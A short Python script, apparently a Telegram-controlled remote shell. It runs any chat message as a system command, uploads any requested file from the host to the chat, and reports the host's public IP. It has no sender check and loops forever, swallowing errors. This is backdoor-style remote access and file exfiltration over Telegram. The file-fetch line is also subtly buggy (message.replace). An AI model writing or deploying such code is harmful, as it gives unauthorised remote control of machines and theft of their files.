import telebot, owlshell, requests
token = 'token'
bot = telebot.TeleBot(token)
@bot.message_handler(content_types=['text'])
def handle(message):
    if message.text.startswith('get '):
        filename = message.replace('get ', '', 1)
        with open(filename, 'rb') as file:
            bot.send_document(message.chat.id, file, visible_file_name=filename)
    elif message.text == 'ip':
        bot.send_message(message.chat.id, requests.get('https://ifconfig.me/ip').text)
    else:
        try:
            bot.send_message(message.chat.id, owlshell.shell(message.text))
        except Exception as e:
            bot.send_message(message.chat.id, f'Error: {e}.')
while True:
    try:
        print('run')
        bot.polling()
    except:
        pass
